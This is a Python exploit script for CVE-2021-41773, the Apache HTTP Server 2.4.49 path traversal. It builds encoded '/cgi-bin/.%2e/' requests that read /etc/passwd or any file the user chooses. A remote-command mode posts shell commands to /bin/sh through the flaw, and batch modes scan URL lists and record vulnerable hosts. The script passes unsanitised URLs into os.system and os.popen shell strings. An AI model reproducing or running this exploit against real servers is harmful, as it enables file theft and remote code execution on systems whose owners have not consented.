#!/usr/bin/python3
#-*- coding: UTF-8 -*-
#Author: afei00123

import requests, urllib3, os, time, argparse
from colorama import init
init(autoreset=True)

def title():
    print("")
    print('*'.center(60, '*'))
    print("Version：Apache HTTP Server=2.4.49".center(40))
    print("github：https://github.com/ltfafei".center(50))
    print("gitee：https://gitee.com/afei00123".center(50))
    print("CSDN: afei00123.blog.csdn.net".center(50))
    print("公众号：网络运维渗透".center(35))
    print("")
    print('*'.center(60, '*'))
    print("")

class CVE_2021_41773():
    def cve_2021_41773_pythonPOC(self, url):
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        payload = f"{url}/cgi-bin/.%2e/.%2e/%2e%2e/%2e%2e/.%2e/etc/passwd"
        headers = {
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
        }
        try:
            scode = requests.get(url=payload, headers=headers, verify=False, timeout=5).status_code
            if scode == 200:
                print(f"\033[31m[+] {url} is vulnerable")
                with open("vuln_urls.txt", 'a') as f:
                    f.writelines(url + "\n")
            else:
                print(f"\033[32m[-] {url} is not vulnerable!")
        except Exception:
            print(f"[-] {url} 请求失败！")

    def cve_2021_41773_curlPOC(self, url):
        payload = "curl -I -m 5 -o /dev/null -s -w %{http_code} " + f"{url}" + "/cgi-bin/.%2e/.%2e/%2e%2e/%2e%2e/.%2e/etc/passwd"
        try:
            status_code = os.popen(payload).read()
            #if "root" in status_code:
            if "200" in status_code:
                print(f"\033[31m[+] {url} is vulnerable")
                with open("vuln_urls.txt", 'a') as f:
                    f.writelines(url + "\n")
            else:
                print(f"\033[32m[-] {url} is not vulnerable!")
        except Exception:
            print("\033[33m[-] 请检查系统是否安装curl")

    def cve_2021_41773_defaultPOC(self, url):
        payload = f"curl -v -m 5 -path-as-is {url}/cgi-bin/.%2e/.%2e/%2e%2e/%2e%2e/.%2e/etc/passwd"
        result = os.system(payload)
        return result

    def cve_2021_41773_definePOC(self, durl, command):
        payload = f"curl -m 5 -v -path-as-is {durl}/cgi-bin/.%2e/.%2e/%2e%2e/%2e%2e/.%2e/{command}"
        result = os.system(payload)
        return result

    def cve_2021_41773_REC_POC(self, rurl, rcommand):
        payload = f"curl -s --path-as-is -d 'echo Content-Type: text/plain; echo; {rcommand}' '{rurl}/cgi-bin/.%2e/.%2e/%2e%2e/%2e%2e/.%2e/bin/sh'"
        result = os.system(payload)
        return result

    def batch_cve_2021_41773_pythonPOC(self, url, pfile):
        if url:
            return True
        elif pfile:
            for url in pfile:
                url = url.replace('\n', '')
                time.sleep(2)
                self.cve_2021_41773_pythonPOC(url)

    def batch_cve_2021_41773_curlPOC(self, url, cfile):
        if url:
            return True
        elif cfile:
            for url in cfile:
                url = url.replace('\n', '')
                time.sleep(2)
                self.cve_2021_41773_curlPOC(url)

if(__name__ == "__main__"):
    title()
    parser = argparse.ArgumentParser(description="CVE-2021-41773 Apache_directory_through Script")
    parser.add_argument(
        '-u', '--url', type=str,
        help='Please input target url, default check. eg: https://ip:port'
    )
    parser.add_argument(
        '-du', '--durl', type=str,
        help='Please input target url, must be with for -c. eg: https://ip:port'
    )
    parser.add_argument(
        '-c', '--command', type=str,
        help='Please input command, define check. eg: /etc/hosts'
    )
    parser.add_argument(
        '-ru', '--rurl', type=str,
        help='Please input target url, must be with for -rc. eg: https://ip:port'
    )
    parser.add_argument(
        '-rc', '--rcommand', type=str,
        help='Please input command, define check. eg: whoami'
    )
    parser.add_argument(
        '-pf', '--pfile', type=argparse.FileType('r'),
        help='Please input urls file path, python request check. eg: c:/urls.txt'
    )
    parser.add_argument(
        '-cf', '--cfile', type=argparse.FileType('r'),
        help='Please input urls file path, curl check. eg: c:/urls.txt'
    )
    args = parser.parse_args()
    run_POC = CVE_2021_41773()
    if args.url:
        run_POC.cve_2021_41773_defaultPOC(args.url)
    if args.durl and args.command:
        run_POC.cve_2021_41773_definePOC(args.durl, args.command)
    if args.rurl and args.rcommand:
        run_POC.cve_2021_41773_REC_POC(args.rurl, args.rcommand)
    if args.pfile:
        run_POC.batch_cve_2021_41773_pythonPOC(args.url, args.pfile)
        print("\n[done] 批量探测完成，请查看：vuln_urls.txt")
    if args.cfile:
        run_POC.batch_cve_2021_41773_curlPOC(args.url, args.cfile)
        print("\n[done] 批量探测完成，请查看：vuln_urls.txt")